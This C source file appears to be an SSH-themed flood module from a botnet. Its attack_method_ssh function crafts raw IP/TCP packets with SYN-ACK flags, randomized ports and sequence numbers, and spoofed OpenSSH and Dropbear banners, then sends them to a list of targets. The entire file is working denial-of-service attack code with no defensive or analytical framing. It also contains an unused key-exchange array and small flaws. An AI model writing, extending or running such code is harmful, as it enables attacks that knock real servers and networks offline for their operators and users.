#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"

static const char *ssh_banners[] = {
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
    "SSH-2.0-OpenSSH_9.3p1 Debian-3",
    "SSH-2.0-OpenSSH_8.2p1",
    "SSH-2.0-OpenSSH_for_Windows_8.6",
    "SSH-2.0-dropbear_2022.83",
    "SSH-2.0-libssh_0.10.4",
    "SSH-2.0-OpenSSH_9.6",
};

static unsigned char ssh_kex_init[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x14, 0x00, 0x00,
    0x00, 0x07, 0x73, 0x73, 0x68, 0x2d, 0x72, 0x73, 0x61, 0x00, 0x00, 0x00, 0x03, 0x73, 0x73, 0x68,
    0x2d, 0x65, 0x64, 0x32, 0x35, 0x35, 0x31, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

#define NUM_BANNERS (sizeof(ssh_banners) / sizeof(ssh_banners[0]))

static void make_iphdr(struct iphdr *iph, ipv4_t src, ipv4_t dst, uint8_t proto, uint16_t len, uint8_t ttl)
{
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(len);
    iph->id = htons(rand_next() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = ttl;
    iph->protocol = proto;
    iph->check = 0;
    iph->saddr = src;
    iph->daddr = dst;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
}

static void make_tcphdr(struct tcphdr *tcph, uint16_t sport, uint16_t dport,
                         uint32_t seq, uint32_t ack, uint8_t flags, uint16_t win)
{
    tcph->source = sport;
    tcph->dest = dport;
    tcph->seq = seq;
    tcph->ack_seq = ack;
    tcph->res1 = 0;
    tcph->doff = 5;
    tcph->fin = (flags >> 0) & 1;
    tcph->syn = (flags >> 1) & 1;
    tcph->rst = (flags >> 2) & 1;
    tcph->psh = (flags >> 3) & 1;
    tcph->ack = (flags >> 4) & 1;
    tcph->urg = (flags >> 5) & 1;
    tcph->window = htons(win);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void attack_method_ssh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    struct sockaddr_in bind_addr;
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 22);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xFFFF);
    uint8_t ttl = (uint8_t)attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    uint8_t tos = (uint8_t)attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint8_t df = (uint8_t)attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 0);

    (void)targs_len;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd == -1)
    {
        fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (fd == -1) return;
    }

    {
        int on = 1;
        setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    }

    bind_addr.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char pkt[2048];
        int pkt_len;
        char *payload;
        int payload_len;
        uint32_t seq, ack;
        uint8_t flags;

        util_zero(pkt, sizeof(pkt));

        iph = (struct iphdr *)pkt;
        tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
        payload = pkt + sizeof(struct iphdr) + sizeof(struct tcphdr);

        if (sport == 0xFFFF)
        {
            sport = rand_next() & 0xFFFF;
            if (sport < 1024) sport += 1024;
        }

        seq = rand_next();
        ack = rand_next();

        bind_addr.sin_port = htons((uint16_t)sport);
        bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        flags = 0x12;
        if (rand_next() % 2 == 0) flags |= 0x08;

        payload_len = snprintf(payload, 1400, "%s\r\n", ssh_banners[rand_next() % NUM_BANNERS]);

        make_iphdr(iph, LOCAL_ADDR, targs[i].addr, IPPROTO_TCP,
                    sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len, ttl);
        iph->tos = tos;
        if (df) iph->frag_off = htons(0x4000);

        make_tcphdr(tcph, htons((uint16_t)sport), htons((uint16_t)dport), seq, ack, flags, 65535);

        pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;

        {
            struct sockaddr_in dst;
            dst.sin_family = AF_INET;
            dst.sin_port = tcph->dest;
            dst.sin_addr.s_addr = iph->daddr;

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + payload_len, iph->tot_len - htons(sizeof(struct iphdr)));

            sendto(fd, pkt, pkt_len, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
        }

        usleep(1000);
    }

    close(fd);
}
